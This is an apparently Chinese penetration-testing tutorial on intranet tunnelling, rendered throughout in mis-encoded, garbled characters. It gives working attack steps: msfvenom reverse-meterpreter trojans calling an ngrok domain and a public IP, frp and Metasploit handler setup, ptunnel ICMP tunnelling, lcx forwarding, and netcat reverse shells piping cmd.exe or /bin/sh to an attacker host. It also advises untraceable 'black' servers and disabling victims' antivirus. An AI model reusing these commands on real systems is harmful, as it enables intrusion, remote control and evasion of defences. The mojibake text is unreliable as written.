æ•ˆæœå¦‚ä¸‹ï¼Œçœ‹åˆ°onlineè¡¨ç¤ºæ­£å¸¸ï¼Œå¦‚æœä¸æ˜¯ï¼Œé‚£å°±æœ‰é—®é¢˜ ## æ§åˆ¶ç«¯ç”Ÿæˆæœ¨é©¬ msfvenom -p windowsmeterpreterreverse_http lhostsyrjaden.free.idcfengye.com lport80 -f exe -o jaden.exe å°†æœ¨é©¬æ”¾åˆ°è¢«æ§åˆ¶ç«¯ è¢«æ§ç«¯ipåœ°å€ä¸º192.168.0.13ï¼ŒæŒ‰ç†è¯´åº”è¯¥è®©ä»–ä»¬ä¸èƒ½ç›´æ¥äº’é€šï¼Œä½†æ˜¯æˆ‘è¿™é‡Œåªæœ‰ä¸€ä¸ªç½‘ç»œï¼Œæ‰€ä»¥ä¸èƒ½è®¾è®¡è¿™æ ·çš„åœºæ™¯ï¼Œå°±ç”¨ä¸¤ä¸ªåŒä¸€ç½‘æ®µçš„è™šæ‹Ÿæœºæ¥æäº†ã€‚æ³¨æ„ï¼Œä¸¤ä¸ªä¸»æœºéƒ½æ˜¯èƒ½ä¸Šç½‘çš„æ‰è¡Œæ˜‚ã€‚æ§åˆ¶ç«¯å¼€å¯ç›‘å¬ åœ¨è¢«æ§ç«¯è¿è¡Œæˆ‘ä»¬çš„æœ¨é©¬ç¨‹åºï¼Œç„¶åè§‚å¯Ÿæˆ‘ä»¬çš„kaliä¸Šçš„Ngrokï¼Œæ”¶åˆ°äº†æ•°æ®ã€‚ 10-10-2 FRPå†…ç½‘ç©¿é€(ftpä»£ç†)Ngrokæ˜¯åˆ«äººçš„è·³æ¿æœºï¼Œæˆ‘ä»¬å¦‚æœæƒ³æ­å»ºè‡ªå·±çš„è·³æ¿æœºï¼Œå°±å¯ä»¥ä½¿ç”¨frpã€npsç­‰å·¥å…·ã€‚ frp æ˜¯åŸºäºGOè¯­è¨€çš„ä¸€ä¸ªä¸“æ³¨äºå†…ç½‘ç©¿é€çš„é«˜æ€§èƒ½çš„åå‘ä»£ç†åº”ç”¨ï¼Œæ”¯æŒ TCPã€UDPã€HTTPã€HTTPSç­‰å¤šç§åè®®ã€‚å¯ä»¥å°†å†…ç½‘æœåŠ¡ä»¥å®‰å…¨ã€ä¾¿æ·çš„æ–¹å¼é€šè¿‡å…·æœ‰å…¬ç½‘ IP èŠ‚ç‚¹çš„ä¸­è½¬æš´éœ²åˆ°å…¬ç½‘ï¼Œç›®å‰æœ€ä¸»æµçš„ä¸€ä¸ªå†…ç½‘ç©¿é€å·¥å…·ï¼Œè¿˜æœ‰ä¸ªå«åšnpsçš„ï¼Œä¹Ÿå¾ˆå‰å®³ï¼Œä½†æ˜¯frpçš„ç”¨æˆ·é‡æ¯”npså¤§ä¸€äº›ï¼Œfrpæ˜¯å¼€æºçš„å¯ä»¥è‡ªå»ºè·³æ¿çš„å·¥å…·ï¼Œè€Œngrokå‘¢æ˜¯å±äºä½¿ç”¨åˆ«äººçš„å…¬ç½‘æœåŠ¡å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬æµ‹è¯•çš„æ—¶å€™å¦‚æœæœ‰ä¸€äº›éšç§ã€å°ç§˜å¯†å•¥çš„ï¼Œé‚£ä¹ˆå°±ä¼šæ„Ÿè§‰æœ‰äº›ä¸å®‰å…¨äº†ï¼Œå› ä¸ºngrokçš„ä½œè€…åº”è¯¥æ˜¯å¯ä»¥ä»»æ„ç™»å½•ä¸Šå»æŸ¥çœ‹ä½ æ”¶é›†çš„ä¿¡æ¯çš„ï¼Œæ‰€ä»¥å¾ˆå¤šäººå–œæ¬¢è‡ªå·±æ¥æ­å»ºæœåŠ¡å™¨ï¼Œè¿™æ—¶å€™å°±å¯ä»¥ç”¨åˆ°frpï¼Œå¹¶ä¸”æˆ‘ä»¬éœ€è¦è‡ªå·±æå‰å‡†å¤‡ä¸€å°å…¬ç½‘æœåŠ¡å™¨ï¼Œè…¾è®¯äº‘ã€é˜¿é‡Œäº‘ç­‰ç­‰ï¼Œå¦‚æœç”¨é˜¿é‡Œäº‘çš„è¯ï¼Œä¼šå—åˆ°ä¸€ä¸ªå®‰å…¨ç»„çš„æœºåˆ¶é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€å¥½ä¸è¦ç”¨é˜¿é‡Œäº‘ï¼Œå› ä¸ºæ€»éœ€è¦è°ƒæ•´å®‰å…¨ç»„ç­–ç•¥ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œæœ‰æ¡ä»¶çš„è¯æœ€å¥½ä¹°ä¸€äº›é»‘æœåŠ¡å™¨ï¼Œä¸éœ€è¦å®åå•¥çš„ï¼Œå¯èƒ½ä»·æ ¼ä¼šé«˜ä¸€äº›ï¼Œä½†æ˜¯ä¸å—é™åˆ¶ï¼Œæ¯”å¦‚æµé‡ã€ç«¯å£è®¾ç½®ç­‰é™åˆ¶ 1ï¼ŒæœåŠ¡ç«¯-ä¸‹è½½-è§£å‹-ä¿®æ”¹-å¯åŠ¨ï¼ˆé˜¿é‡Œäº‘ä¸»æœºè®°å¾—ä¿®æ”¹å®‰å…¨ç»„é…ç½®å‡ºå…¥å£ï¼‰ ## æœåŠ¡å™¨ä¿®æ”¹é…ç½®æ–‡ä»¶frps.iniï¼š bind_port 6677 #frpså·¥ä½œç«¯å£ï¼Œå¿…é¡»å’Œfrpcä¿æŒä¸€è‡´ ## å¯åŠ¨æœåŠ¡ç«¯ï¼š .frps -c .frps.ini 2.æ§åˆ¶ç«¯-ä¸‹è½½-è§£å‹-ä¿®æ”¹-å¯åŠ¨ ## æ§åˆ¶ç«¯ä¿®æ”¹é…ç½®æ–‡ä»¶frpc.iniï¼š server_addr [ä½ çš„äº‘ä¸»æœºip] server_port 6677 #frpcå·¥ä½œç«¯å£ï¼Œå¿…é¡»å’Œfrpsä¿æŒä¸€è‡´ [msf] type tcp local_ip 127.0.0.1 local_port 5555 #è½¬å‘ç»™æœ¬æœºçš„5555 remote_port 6000 #æœåŠ¡ç«¯ç”¨6000ç«¯å£è½¬å‘ç»™æœ¬æœº ## å¯åŠ¨å®¢æˆ·ç«¯ï¼š .frpc -c .frpc.ini ## ç”Ÿæˆåé—¨ msfvenom -p windowsmeterpreterreverse_tcp lhost[æœåŠ¡å™¨IPåœ°å€] lport6000 -f exe -o frp.exe ## ç›‘å¬åé—¨ use exploitmultihandler set payload windowsmeterpreterreverse_tcp set LHOST 127.0.0.1 set LPORT 5555 exploit 3.é¶æœºè¿è¡Œfrpå³å¯ ## Sunny-Ngrokï¼ˆä¹Ÿæä¾›FRPï¼‰ï¼šhttp://www.ngrok.cc/ ## äº†è§£å¦‚ä½•éƒ¨ç½²ã€ä½¿ç”¨frpï¼šhttps://gofrp.org/docs/ ## frpï¼šhttps://github.com/fatedier/frp ## CFSä¸‰å±‚é¶æœºç¯å¢ƒï¼šhttps://pan.baidu.com/s/1l5-TOVe9FO8mEjCiZ4mtMQ æå–ç ï¼šxiao å®éªŒ ç¯å¢ƒï¼šfrpæ˜¯ä¸€ä¸ªCSæ¶æ„çš„ç¨‹åºï¼Œæœ‰å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ ## æœåŠ¡ç«¯(é˜¿é‡Œäº‘æœåŠ¡å™¨ï¼Œæˆ‘çš„æ˜¯utuntu18.04ï¼Œ1vcpu,2gå†…å­˜) ## å®¢æˆ·ç«¯(æ”»å‡»æœºï¼škali2022) ## è‚‰é¸¡(win7) ä¸‹è½½FRP å…ˆä¸‹è½½frpï¼Œç›®å‰ç‰ˆæœ¬æ˜¯0.44.0 å®¢æˆ·ç«¯ æ”¾åˆ°kaliä¸Šï¼Œè§£å‹ åœ¨kaliä¸Šé…ç½®å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ æœåŠ¡ç«¯ å°†æˆ‘ä»¬ä¸‹è½½çš„frpæ”¾åœ¨é˜¿é‡Œäº‘æœåŠ¡å™¨ä¸Šï¼Œç°åœ¨é˜¿é‡Œäº‘æœåŠ¡å™¨æœ‰å®‰å…¨ç®¡æ§åŠŸèƒ½äº†ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨é˜¿é‡Œäº‘ä¸Šè§£å‹ï¼Œä¼šè¢«é˜»æ‹¦ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æœ¬æœºè§£å‹å¥½ï¼Œé€šè¿‡sftpä¸Šä¼ ä¸Šå»ã€‚ è§£å‹å¹¶é…ç½®frps.iniï¼Œä¿®æ”¹ç«¯å£å·ï¼Œå’Œæˆ‘ä»¬åˆšæ‰åœ¨å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ä¸­é…ç½®çš„server_addrè¦ä¸€è‡´ è¿è¡ŒæœåŠ¡ç«¯çš„frpç¨‹åº .frps -c .frps.ini ï¼Œåˆšå¼€å§‹å¯èƒ½æ²¡æœ‰æƒé™æ‰§è¡Œï¼Œéœ€è¦åŠ æ‰§è¡Œæƒé™ æ³¨æ„åœ¨é˜¿é‡Œäº‘å®ä¾‹ä¸­æ·»åŠ å®‰å…¨ç»„è§„åˆ™ï¼Œå°†6677å’Œ6000ç«¯å£æ”¾è¡Œ ç„¶åè¿è¡Œå®¢æˆ·ç«¯ç¨‹åº æœåŠ¡ç«¯å°±æ”¶åˆ°äº†å®¢æˆ·ç«¯çš„è¿æ¥æ•°æ® æ¥ä¸‹æ¥ç”Ÿæˆåé—¨ç¨‹åºï¼Œç„¶ååˆ°è‚‰æœºä¸Šæ‰§è¡Œ msfvenom -p windowsmeterpreterreverse_tcp lhost182.92.4.57 lport6000 -f exe -o frp.exe ï¼Œlportå¯¹åº”çš„æ˜¯kaliä¸Šfrpcé…ç½®ä¸­çš„remote_addrçš„å€¼ã€‚ msfvenom -p windowsmeterpreterreverse_tcp lhost182.92.4.57 lport6000 -f exe -o frp.exe ç„¶åmsfå¼€å¯ç›‘å¬ï¼Œç›‘å¬çš„ipå’Œportå’Œä¸Šé¢å®¢æˆ·ç«¯çš„frpcé…ç½®çš„local_ipå’Œlocal_portä¸€è‡´ æ‹¿åˆ°win7ä¸Šæ‰§è¡Œï¼Œå…³é—­æ€è½¯æˆ–è€…å¯¹ç›®å½•å…æ€å¤„ç†ï¼Œåˆ«æ€æ‰äº† åŒå‡»è¿è¡Œfrp.exeç¨‹åºï¼Œç„¶åå†çœ‹kaliï¼Œæ”¶åˆ°ä¼šè¯äº† shellè¿›å»å¯ä»¥æ‰§è¡ŒæŒ‡ä»¤ frpæ¯”ngrokæ›´åŠ çµæ´»ï¼Œå› ä¸ºæˆ‘ä»¬è‡ªå·±æ­å»ºçš„ï¼Œåœ°å€éƒ½å¯ä»¥æˆ‘ä»¬è‡ªå·±æŒ‡å®šã€‚ 10-10-3 éš§é“å†…ç½‘æ¸—é€åŒ…å«ï¼šå±€åŸŸç½‘ã€åŸŸæ¸—é€ã€å†…ç½‘ç©¿é€ç­‰æŠ€æœ¯ï¼Œå†…ç½‘ç©¿é€åˆåˆ†ä»£ç†å’Œéš§é“ã€‚ å†…ç½‘ç©¿é€ä¸»è¦æ˜¯ä¸ºäº†è§£å†³å†…ç½‘ä¸­é€šä¿¡çš„é—®é¢˜ï¼Œä»£ç†å¯ä»¥è§£å†³ä¸€äº›é˜²ç«å¢™çš„æ‹¦æˆªé—®é¢˜ï¼Œéš§é“å¯ä»¥è§£å†³ä¸€äº› å®‰å…¨è®¾å¤‡ã€æµé‡ç›‘æ§ç­‰è®¾å¤‡çš„æ‹¦æˆªé—®é¢˜ã€‚ ## å¸¸ç”¨çš„éš§é“æŠ€æœ¯æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š ç½‘ç»œå±‚ï¼šIPv6éš§é“ã€ICMPéš§é“ ä¼ è¾“å±‚ï¼šTCPéš§é“ã€UDPéš§é“ã€å¸¸è§„ç«¯å£è½¬å‘ åº”ç”¨å±‚ï¼šSSHéš§é“ã€HTTPSéš§é“ã€DNSéš§é“ æ£€æµ‹ç½‘ç»œè”é€šæƒ…å†µ 1.TCPåè®® ## ç”¨â€œç‘å£«å†›åˆ€â€netcatï¼Œæ‰§è¡Œncå‘½ä»¤ï¼š nc ç«¯å£ ## è¿˜æœ‰ä¸ªlcx 2.HTTPåè®® ## ç”¨curlå·¥å…·ï¼Œæ‰§è¡Œï¼š curl IPåœ°å€:ç«¯å£ ## å¦‚æœè¿œç¨‹ä¸»æœºå¼€å¯äº†ç›¸åº”çš„ç«¯å£ï¼Œä¸”å†…ç½‘å¯è¿æ¥å¤–ç½‘çš„è¯ï¼Œå°±ä¼šè¾“å‡ºç›¸åº”çš„ç«¯å£ä¿¡æ¯ 3.ICMPåè®® ## ç”¨pingå‘½ä»¤ï¼Œæ‰§è¡Œï¼š ping IPåœ°å€åŸŸå 4.DNSåè®® ## æ£€æµ‹DNSè¿é€šæ€§å¸¸ç”¨çš„å‘½ä»¤æ˜¯nslookupå’Œdig ## nslookupæ˜¯windowsè‡ªå¸¦çš„DNSæ¢æµ‹å‘½ä»¤ ## digæ˜¯linuxç³»ç»Ÿè‡ªå¸¦çš„DNSæ¢æµ‹å‘½ä»¤ 3-1 ç½‘ç»œå±‚ICMPéš§é“ç¤ºä¾‹ptunnelæ˜¯è€ç‰Œçš„ä¸€ä¸ªå·¥å…·ï¼Œæœ‰windowsã€linuxç‰ˆæœ¬çš„ï¼Œå…¶å®ä¸æ¨èä½¿ç”¨ï¼Œå› ä¸ºä¸æ€ä¹ˆæ›´æ–°äº†ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªå‡çº§ç‰ˆçš„pingtunnelå·¥å…·ä¸€ç›´åœ¨æ›´æ–°ï¼Œè¿™ä¸ªæŒºå¥½ã€‚ç°åœ¨æˆ‘ä»¬æ¼”ç¤ºçš„è¿˜æ˜¯è¿™ä¸ªè€ç‰Œçš„ï¼Œå°†æ¥å¤§å®¶å¦‚æœæœ‰è¿™æ–¹é¢çš„éœ€è¦ï¼Œå»ºè®®æ–°ç‰ˆçš„ï¼Œå¹¶ä¸”æ–°ç‰ˆçš„æ”¯æŒå„ç±»æ“ä½œç³»ç»Ÿ é˜²ç«å¢™ä¸€èˆ¬ä¸ä¼šå±è”½pingçš„æ•°æ®åŒ…ï¼Œå®ç°ä¸å—é™åˆ¶çš„è®¿é—®è®¿é—®ã€‚ å‚æ•°è¯´æ˜ï¼š -p ## è¡¨ç¤ºè¿æ¥icmpéš§é“å¦ä¸€ç«¯çš„æœºå™¨IPï¼ˆå³ç›®æ ‡æœåŠ¡å™¨ï¼‰ -lp ## è¡¨ç¤ºéœ€è¦ç›‘å¬çš„æœ¬åœ°tcpç«¯å£ -da ## æŒ‡å®šéœ€è¦è½¬å‘çš„æœºå™¨çš„IPï¼ˆå³ç›®æ ‡å†…ç½‘æŸä¸€æœºå™¨çš„å†…ç½‘IPï¼‰ -dp ## æŒ‡å®šéœ€è¦è½¬å‘çš„æœºå™¨çš„ç«¯å£ï¼ˆå³ç›®æ ‡å†…ç½‘æŸä¸€æœºå™¨çš„å†…ç½‘ç«¯å£ï¼‰ -x ## è®¾ç½®è¿æ¥çš„å¯†ç  å‡†å¤‡æµ‹è¯•ç¯å¢ƒ centos7 é…ç½®åŒç½‘å¡ ç„¶åè¿›å…¥å‘½ä»¤ç»ˆç«¯è¿›è¡Œé…ç½®ï¼Œæˆ‘ä»¬çœ‹åˆ°å¤šå‡ºæ¥ä¸€ä¸ªens36ï¼Œå¯¹å®ƒå†è¿›è¡Œé…ç½®å³å¯ cd etcsysconfignetwork-scripts cp ifcfg-ens33 ifcfg-ens36 ä¿®æ”¹ifcfg-ens36çš„é…ç½®ï¼Œå¦‚ä¸‹ TYPEâ€Ethernetâ€ PROXY_METHODâ€noneâ€ BROWSER_ONLYâ€noâ€ BOOTPROTOâ€staticâ€ DEFROUTEâ€yesâ€ IPV4_FAILURE_FATALâ€noâ€ IPV6INITâ€yesâ€ IPV6_AUTOCONFâ€yesâ€ IPV6_DEFROUTEâ€yesâ€ IPV6_FAILURE_FATALâ€noâ€ IPV6_ADDR_GEN_MODEâ€stable-privacyâ€ NAMEâ€ens36â€ # UUIDâ€be3c28c6-18bd-4191-a425-55836be83dd1â€ DEVICEâ€ens36â€ ONBOOTâ€yesâ€ IPADDRâ€192.168.11.120â€ ç„¶åé‡å¯ç½‘å¡ systemctl restart network ï¼Œçœ‹åˆ°æˆ‘ä»¬è®¾ç½®çš„ipåœ°å€äº† ç›®æ ‡ä¸»æœºwin7çš„ç½‘å¡ipä¹Ÿæ”¹ä¸€ä¸‹ï¼Œå’Œcentos7ä¸€ä¸ªç½‘æ®µ ä¸¤ä¸ªå†…ç½‘çš„ipéƒ½é…ç½®å¥½äº†ï¼Œæˆ‘ä»¬äº’ç›¸pingä¸€ä¸‹ï¼Œçœ‹çœ‹å†…ç½‘çš„ä¸¤ä¸ªipæ˜¯å¦äº’é€šï¼Œkaliæ”»å‡»ä¸»æœºå’Œå†…ç½‘ä¸­çš„win7ä¸»æœºæ˜¯å¦ä¸é€šã€‚ å¯¹äº†ï¼Œåˆ«å¿˜äº†å¼€å¯win7çš„è¿œç¨‹è¿æ¥ å¥½ï¼Œæµ‹è¯•ç¯å¢ƒå‡†å¤‡å®Œæ¯•ï¼Œå¹¶ä¸”å……åˆ†è¯æ˜win7è¿™ä¸ªä¸»æœºçš„ICMPåè®®å¯ä»¥æ­£å¸¸é€šä¿¡ï¼Œè¿™æ˜¯å‰ææ¡ä»¶æ˜‚ï¼Œå¿…é¡»æ­£å¸¸æ‰è¡Œã€‚ å¼€å§‹æµ‹è¯• kaliä¸Šæ‰§è¡Œï¼š .ptunnel -p 192.168.241.193 -lp 1080 -da 192.168.11.121 -dp 3389 -x jaden ä¸­é—´ä¸»æœºcentos7å¼€å¯éš§é“ï¼Œå¯†ç ä¸ºjaden centos7 å®‰è£…ptunnel https://www.cnblogs.com/autopwn/p/14642658.html #å®‰è£…libpcapçš„ä¾èµ–ç¯å¢ƒ cd opt yum -y install byacc yum -y install flex bison #å®‰è£…libpcapä¾èµ–åº“ wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz tar -xzvf libpcap-1.9.0.tar.gz cd libpcap-1.9.0 .configure make make install #å®‰è£…PingTunnel cd opt wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz tar -xzvf PingTunnel-0.72.tar.gz cd PingTunnel make make install ## å®‰è£…å®Œæˆä¹‹åç›´æ¥å¯ä»¥æ‰§è¡Œå‘½ä»¤ ## åœ¨ä¸­ä»‹æœºcentos7æ‰§è¡Œï¼š .ptunnel -x [å¯†ç ] .ptunnel -x jaden ## å¯åŠ¨ptunnelï¼Œè®¾ç½®è¿æ¥å¯†ç ä¸ºjaden ## åœ¨æ”»å‡»æœºkali jadenæ‰§è¡Œï¼š .ptunnel -p [ä¸­ä»‹æœº] -lp [æœ¬æœºç«¯å£] -da [è¢«æ”»å‡»æœº] -dp [è¢«æ”»å‡»æœºç«¯å£] -x [å¯†ç ] .ptunnel -p 192.168.241.193 -lp 1080 -da 192.168.11.121 -dp 3389 -x jaden ## å½“192.168.241.193ï¼ˆpï¼‰æ”¶åˆ°æ¥è‡ª192.168.11.121ï¼ˆdaï¼‰çš„3389ç«¯å£ï¼ˆdpï¼‰çš„æ•°æ®æ—¶ï¼Œå‘é€åˆ°æ”»å‡»æœºçš„1080ç«¯å£ï¼ˆlpï¼‰ã€‚åä¹‹äº¦ç„¶ï¼ˆåœ¨äºŒè€…ä¹‹é—´å»ºç«‹éš§é“ï¼‰ rdesktop [IP] [ç«¯å£] rdesktop 127.0.0.1:1080 ## è°ƒç”¨è¿œç¨‹æ¡Œé¢è®¿é—®æœ¬åœ°çš„1080ï¼Œä¹Ÿå°±æ˜¯ç›®æ ‡æœºçš„3389 è€ç‰ˆæœ¬ä»‹ç»ï¼šhttps://github.com/f1vefour/ptunnel(éœ€è‡ªè¡Œç¼–è¯‘) æ–°ç‰ˆæœ¬ä»‹ç»ï¼šhttps://github.com/esrrhs/pingtunnel(äºŒæ¬¡å¼€å‘ç‰ˆ) å®‰è£…å®Œä¸Šé¢çš„å·¥å…·ä¹‹åï¼Œæ‰§è¡Œ .ptunnel -x jaden å¯èƒ½ä¼šçœ‹åˆ°å¦‚ä¸‹æŠ¥é”™ ä¿®æ”¹å¦‚ä¸‹å†…å®¹ ## ç¬¬ä¸€æ­¥ï¼Œå»ºç«‹è½¯é“¾ sudo ln -s usrlocalliblibpcap.so.1 usrliblibpcap.so.1 ## ç¬¬äºŒæ­¥ï¼šæ·»åŠ ä¸¤ä¸ªè·¯å¾„ ## å°†libpcap.so.1æ‰€åœ¨ç›®å½•æ·»åŠ åˆ°æ–‡ä»¶etcld.so.confä¸­ï¼Œ vi etcld.so.conf ## åŠ ä¸Šä¸‹é¢ä¸¤ä¸ª usrlocallib usrlib ## ç„¶åä¿å­˜ ## ç¬¬ä¸‰æ­¥ï¼šé‡æ–°åŠ è½½é…ç½®ï¼Œå¦‚æœä½ æ˜¯rootç”¨æˆ·ï¼Œå°±ä¸ç”¨å†™sudoäº† sudo ldconfig ç„¶åé‡æ–°æ‰§è¡ŒæŒ‡ä»¤ åœ¨æ”»å‡»æœºä¸Šå†å¯ç”¨ä¸€ä¸ªç»ˆç«¯ï¼Œæ‰§è¡Œè¿æ¥æŒ‡ä»¤ rdesktop 127.0.0.1:1080 ,æ•ˆæœå¦‚ä¸‹ï¼Œå¦‚æœä¸€æ¬¡æ²¡æœ‰æˆåŠŸå°±å¤šæ‰§è¡Œå‡ æ¬¡è¿™ä¸ªæŒ‡ä»¤ è¿™æ ·åšæœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿæˆ‘ä»¬å¦‚æœé€šè¿‡centos7ä¸»æœºç›´æ¥è¿æ¥win7ä¸»æœºçš„3389ï¼Œå¯èƒ½ç”±äºcentos7ä¸»æœºä¸Šé˜²ç«å¢™çš„é—®é¢˜è¿‡æ»¤äº†3389ç«¯å£æ•°æ®ï¼Œå¯¼è‡´æˆ‘ä»¬æ”»å‡»æœºä¸èƒ½æ‹¿åˆ°äº¤äº’æ•°æ®ï¼Œé‚£ä¹ˆè¿™ä¸ªå·¥å…·å…¶å®æ˜¯æ²¡æœ‰ä½¿ç”¨è¿œç¨‹æ¡Œé¢è¿æ¥åè®®æ¥ä¼ è¾“æ•°æ®ï¼Œå¯èƒ½åº•å±‚æ˜¯tcpâ€˜åè®®ï¼Œè€Œæ˜¯å˜æ¢æˆäº†icmpåè®®æ¥ä¼ é€’tcpåè®®çš„æ•°æ®ã€‚è¿™å°±æ˜¯ä¸€ä¸ªicmpåè®®éš§é“ã€‚ 3-2 ä¼ è¾“å±‚TCPéš§é“ä¹‹ç«¯å£è½¬å‘Windowsï¼šlcx Linuxï¼športmap https://github.com/MrAnonymous-1/lcx ## åœ¨è¢«æ”»å‡»æœºä¸Šï¼š lcx -slave [ä¸­ä»‹æœºIP] 3131 127.0.0.1 3389 ## å°†ï¼ˆè¢«æ”»å‡»æœºï¼‰æœ¬åœ°çš„3389è·Ÿä¸­ä»‹æœºIPçš„3131å»ºç«‹éš§é“ ## åœ¨ä¸­ä»‹æœºä¸Šï¼š lcx -listen [æœ¬æœºç«¯å£] [æ”»å‡»æœºç«¯å£] lcx -listen 3131 3333 ## ç›‘å¬3131è½¬å‘è‡³3333 ## åœ¨æ”»å‡»æœºä¸Šï¼š rdesktop [ä¸­ä»‹æœºIP]:3333 ## è¿œç¨‹è¿æ¥ lcxæ¼”ç¤ºï¼Œæˆ‘ä»¬å‰é¢è®²è¿‡lcxå’Œncï¼Œè¿™é‡Œå°±ä¸å¤šæ¼”ç¤ºäº†ã€‚åœ¨çœ‹ä¸€ä¸ªncçš„ç¤ºä¾‹å§ï¼ŒNCè¿™ä¸ªä¸œè¥¿åœ¨windowså’Œlinuxä¸Šéƒ½èƒ½ç”¨ï¼Œå¹¶ä¸”linuxæ˜¯è‡ªå¸¦è¿™ä¸ªæŒ‡ä»¤çš„ï¼Œä½†æ˜¯è‡ªå¸¦çš„å¯èƒ½ç‰ˆæœ¬æ¯”è¾ƒè€ï¼Œæ¯”è¾ƒè€çš„è¯å¯ä»¥ä¸æ”¯æŒ-eå‚æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬æœ€å¥½æ³¨æ„çš„å°±æ˜¯è¦ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬æˆ–è€…è¯´é«˜ç‰ˆæœ¬ ## è¦ç¡®å®šä¸ºæ˜¯å¦ä¸ºæœ€æ–°ç‰ˆæœ¬ï¼Œè€ç‰ˆæœ¬ä¸æ”¯æŒ-eå†™æ³• ## Linuxè‡ªå¸¦nc ## å—å®³ä¸»æœºèƒ½æ‰¾åˆ°æ”»å‡»æœºå°±ç”¨æ­£å‘ï¼Œä¸èƒ½åˆ™ç”¨åå‘ 1.åŒå‘è¿æ¥åå¼¹shell æ­£å‘ï¼šæ”»å‡»è¿æ¥å—å®³ ## å—å®³ï¼š nc -ldp 1234 -e binsh ## linux nc -ldp 1234 -e c:\\windows\\system32\\cmd.exe ## windows ## å°†å‘½ä»¤è¡Œç•Œé¢ï¼ˆshellcmdï¼‰æ¨åˆ°1234ç«¯ ## æ”»å‡»ï¼š nc 192.168.241.132 1234 ä¸»åŠ¨è¿æ¥ åå‘ï¼šå—å®³è¿æ¥æ”»å‡» ## æ”»å‡»ï¼š nc -lvp 1234 ## ç›‘å¬è‡ªå·±çš„1234ç«¯å£ ## å—å®³ï¼š nc [æ”»å‡»æœºIP] 1234 -e binsh nc [æ”»å‡»æœºIP] 1234 -e c:\\windows\\system32\\cmd.exe ## å°†å‘½ä»¤è¡Œç•Œé¢ï¼ˆshellcmdï¼‰æ¨åˆ°æ”»å‡»æœºIPçš„1234ç«¯ 2.å¤šå‘è¿æ¥åå¼¹shell-é…åˆè½¬å‘ ## åå‘ï¼š god\\Webserverï¼š Lcx.exe -listen 2222 3333 god\\Sqlserverï¼š nc 192.168.241.31 2222 -e c:\\windows\\system32\\cmd.exe kaliï¼š nc -v 192.168.0.11 3333 ## SQLæœåŠ¡å™¨å°†è‡ªå·±çš„cmdæ˜ å°„åˆ°ç½‘ç»œæœåŠ¡å™¨çš„2222ç«¯å£ï¼Œç½‘ç»œæœåŠ¡å™¨å†å°†2222æ˜ å°„åˆ°è‡ªå·±çš„3333ç«¯å£ï¼Œæœ€åç”±æ”»å‡»æœºè®¿é—® 3.ç›¸å…³netcatä¸»è¦åŠŸèƒ½æµ‹è¯• æŒ‡çº¹æœåŠ¡ï¼šnc -nv 192.168.0.11 ç«¯å£æ‰«æï¼šnc -v -z 192.168.0.11 1-100 ç«¯å£ç›‘å¬ï¼šnc -lvp xxxx æ–‡ä»¶ä¼ è¾“ï¼šnc -lp 1111 1.txt|nc -vn xx.xx.x.x 1111 1.txt -q 1 åå¼¹Shellï¼šè§ä¸Š NCæ”¯æŒæ­£å‘å’Œåå‘è¿æ¥ï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå¤šå‘è¿æ¥åå¼¹shellçš„ç¤ºä¾‹ç»™å¤§å®¶è®²è§£ã€‚ åœºæ™¯ï¼šwin7çš„shellè½¬å‘åˆ°win10å†è½¬å‘åˆ°kaliï¼Œwin7å’Œkaliä¸èƒ½ç›´æ¥é€šä¿¡ã€‚ win7: 192.168.11.121 webserver: 192.168.11.122 192.168.0.14 kali: 192.168.0.11 win10åŒç½‘å¡ win10ä¸Šæ‰§è¡ŒLCXç›‘å¬ï¼š Lcx.exe -listen 2222 3333 å°†win7ä¸»æœºçš„ç«¯å£æ•°æ®(cmdç»ˆç«¯æ•°æ®)é€šè¿‡ncè½¬å‘å‡ºæ¥ nc 192.168.11.22 -e c:\\windowssystem32\\cmd.exe win10ä¸Šæ”¶åˆ°äº†æ•°æ® é€šè¿‡kaliæ¥è¿æ¥win10ä¸»æœºçš„3333ç«¯å£ï¼Œlinuxè‡ªå¸¦nc nc 192.168.0.16 3333 shellåå¼¹æˆåŠŸã€‚ ncèµ°çš„æ˜¯tcpåè®®ï¼Œå¦‚æœå¯¹æ–¹æ²¡æœ‰ç¦æ‰tcpåè®®ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ncè½¬å‘æ¥æ§åˆ¶ç›®æ ‡ ncå‡ºäº†ç«¯å£ç›‘å¬ã€ç«¯å£è½¬å‘ä¹‹å¤–ï¼Œè¿˜æœ‰å…¶ä»–çš„åŠŸèƒ½ï¼Œæ¯”å¦‚ç«¯å£æ‰«æã€æŒ‡çº¹ä¿¡æ¯æ¢æµ‹ã€æ–‡ä»¶ä¼ è¾“ æ¯”å¦‚ï¼šç«¯å£æ‰«é¢ 3-3 åº”ç”¨å±‚DNSéš§é“å®æˆ˜ä¸­ç”¨çš„æœ€å¤šçš„ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬æœ€é‡è¦çš„ä¸€ä¸ªéš§é“ï¼Œç½‘ç»œå±‚å’Œä¼ è¾“å±‚çš„éš§é“åœ¨å®æˆ˜ä¸­å¯èƒ½ç»å¸¸è¢«æ‹¦æˆªã€‚ æˆ‘ä»¬æ¼”ç¤ºä¸€ä¸ªDNSéš§é“é…åˆCSæ¥ä¸Šçº¿å†…ç½‘ä¸»æœºã€‚ ## åº”ç”¨å±‚DNSéš§é“é…åˆCSä¸Šçº¿-æ£€æµ‹ï¼Œåˆ©ç”¨ï¼Œè¯´æ˜ ## å½“å¸¸è§åè®®ç›‘å¬å™¨è¢«æ‹¦æˆªæ—¶ï¼Œå¯ä»¥æ¢å…¶ä»–åè®®ä¸Šçº¿ï¼Œå…¶ä¸­dnsåè®®ä¸Šçº¿åŸºæœ¬é€šæ€ 